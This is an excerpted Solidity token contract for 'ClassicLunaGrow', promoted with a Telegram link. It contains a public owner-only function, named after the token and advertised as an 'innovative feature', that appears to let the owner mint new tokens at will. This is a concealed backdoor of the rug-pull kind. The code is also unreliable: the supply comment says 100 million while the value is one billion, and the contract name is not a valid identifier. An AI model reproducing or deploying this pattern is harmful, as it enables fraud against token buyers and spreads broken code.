...
//
// $ClassicLunaGrow proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/classiclunagrow
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ClassicLunaGrow(uint256 amount) public onlyOwner {
 _ClassicLunaGrow(msg.sender, amount);
    }
    ...
    function _ClassicLunaGrow(address account, uint256 amount) internal virtual {
...
contract $ClassicLunaGrow is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ClassicLunaGrow", "CLUNAGRW") {
     _ClassicLunaGrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}